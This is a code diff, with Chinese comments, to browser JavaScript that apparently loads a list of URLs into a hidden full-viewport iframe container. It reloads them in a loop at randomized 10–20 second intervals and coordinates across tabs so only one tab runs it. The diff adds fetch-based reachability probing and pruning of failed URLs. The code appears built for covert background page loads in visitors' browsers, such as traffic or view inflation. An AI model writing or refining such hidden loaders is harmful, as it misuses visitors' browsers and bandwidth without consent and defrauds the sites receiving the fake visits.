@@ -109,6 +109,8 @@ hiddenContainer.style.width = "100vw";
 hiddenContainer.style.height = "100vh";
 var currentTimeout = null;
 var currentIframes = [];
+var failedUrls = [];
+var probed = false;
 
 var COORD_LOCK_KEY = '_js_loop_lock_ts';
 var LOCK_TTL = 3000;
@@ -156,6 +158,10 @@ function tryAcquireLock() {
 
 function startLoopIfLeader() {
     if (isLoopRunning) return;
+    if (linkList.length === 0) {
+        releaseLock();
+        return;
+    }
     isLoopRunning = true;
     runIframeLoop();
 }
@@ -170,6 +176,10 @@ function stopLoop() {
         currentTimeout = null;
     }
     currentIframes.forEach(function(iframe) {
+        if (iframe.failTimer) {
+            clearTimeout(iframe.failTimer);
+            delete iframe.failTimer;
+        }
         if (iframe.loadListener) {
             iframe.removeEventListener('load', iframe.loadListener);
             delete iframe.loadListener;
@@ -180,24 +190,106 @@ function stopLoop() {
     });
     currentIframes = [];
     hiddenContainer.innerHTML = '';
-}function runIframeLoop() {
-    cleanup();
-    
-    var pendingIframes = linkList.length;
-    
-    function checkAllLoaded() {
-        pendingIframes--;
-        if (pendingIframes <= 0 && currentTimeout) {
-            clearTimeout(currentTimeout);
-            if (isLoopRunning) {
-                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 10000) + 10000);
-            } else {
-                isLoopRunning = false;
+}function randomDelay() {
+    return Math.floor(Math.random() * 10000) + 10000;
+}
+
+// 用 fetch(no-cors) 探测链接是否真的可达（DNS/连接失败会 reject，视为无效）
+function probeUrl(url, timeout) {
+    return new Promise(function(resolve) {
+        var controller = ('AbortController' in window) ? new AbortController() : null;
+        var timer = null;
+        if (controller) {
+            timer = setTimeout(function() {
+                controller.abort();
+                resolve(false);
+            }, timeout);
+        }
+        var opts = { method: 'GET', mode: 'no-cors', cache: 'no-store', redirect: 'follow' };
+        if (controller) opts.signal = controller.signal;
+        fetch(url, opts).then(function() {
+            if (timer) clearTimeout(timer);
+            resolve(true);
+        }).catch(function() {
+            if (timer) clearTimeout(timer);
+            resolve(false);
+        });
+    });
+}
+
+// 探测当前全部链接，把不可达的加入 failedUrls，只保留有效的
+function probeAndPrune(callback) {
+    var urls = linkList.filter(function(url) {
+        return failedUrls.indexOf(url) === -1;
+    });
+    if (urls.length === 0) { callback(); return; }
+    var remaining = urls.length;
+    var valid = [];
+    urls.forEach(function(url) {
+        probeUrl(url, 8000).then(function(ok) {
+            if (ok) {
+                valid.push(url);
+            } else if (failedUrls.indexOf(url) === -1) {
+                failedUrls.push(url);
             }
+            remaining--;
+            if (remaining <= 0) {
+                linkList = valid;
+                callback();
+            }
+        });
+    });
+}
+
+function runIframeLoop() {
+    cleanup();
+
+    // 剔除已判定失败的链接
+    linkList = linkList.filter(function(url) {
+        return failedUrls.indexOf(url) === -1;
+    });
+
+    var urls = linkList.slice();
+    if (urls.length === 0) {
+        stopLoop();
+        return;
+    }
+
+    var pendingIframes = urls.length;
+    var roundFinished = false;
+
+    function scheduleNextRound() {
+        if (roundFinished) return;
+        roundFinished = true;
+        if (currentTimeout) {
+            clearTimeout(currentTimeout);
+            currentTimeout = null;
+        }
+        if (!isLoopRunning) return;
+        if (!probed) {
+            // 第一次全部加载完成后：探测一次，剔除不可达链接，之后只用有效的
+            probed = true;
+            probeAndPrune(function() {
+                if (!isLoopRunning) return;
+                if (linkList.length === 0) {
+                    stopLoop();
+                    return;
+                }
+                currentTimeout = setTimeout(runIframeLoop, randomDelay());
+            });
+        } else {
+            currentTimeout = setTimeout(runIframeLoop, randomDelay());
         }
     }
-    
-    linkList.forEach(function(url) {
+
+    function checkAllLoaded() {
+        pendingIframes--;
+        if (pendingIframes <= 0) {
+            scheduleNextRound();
+        }
+    }
+
+    urls.forEach(function(url) {
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-same-origin";
         iframe.src = url;
@@ -211,25 +303,43 @@ function stopLoop() {
         iframe.setAttribute("muted", "muted");
         iframe.loadListener = checkAllLoaded;
         currentIframes.push(iframe);
-        
+
+        // 兜底超时：load 一直不触发时结束本轮并标记为失败
+        iframe.failTimer = setTimeout(function() {
+            if (failedUrls.indexOf(url) === -1) {
+                failedUrls.push(url);
+            }
+            checkAllLoaded();
+        }, 8000);
+
+        function onLoad() {
+            if (iframe.failTimer) {
+                clearTimeout(iframe.failTimer);
+                delete iframe.failTimer;
+            }
+            checkAllLoaded();
+        }
+
         if (iframe.contentDocument && iframe.contentDocument.readyState === 'complete') {
+            if (iframe.failTimer) {
+                clearTimeout(iframe.failTimer);
+                delete iframe.failTimer;
+            }
             checkAllLoaded();
         } else {
-            iframe.addEventListener('load', checkAllLoaded);
+            iframe.addEventListener('load', onLoad);
         }
-        
+
         hiddenContainer.appendChild(iframe);
     });
-    
+
+    // 兜底：即使计数没触发完，最迟 N 秒后也进入下一轮
     currentTimeout = setTimeout(function() {
-        if (currentTimeout) {
-            if (isLoopRunning) {
-                currentTimeout = setTimeout(runIframeLoop, Math.floor(Math.random() * 10000) + 10000);
-            } else {
-                isLoopRunning = false;
-            }
+        if (currentTimeout && !roundFinished) {
+            scheduleNextRound();
         }
-    }, Math.floor(Math.random() * 3000) + 11000);}window.addEventListener('beforeunload', function() {
+    }, Math.floor(Math.random() * 3000) + 11000);
+}window.addEventListener('beforeunload', function() {
     if (isLoopRunning) {
         releaseLock();
     }
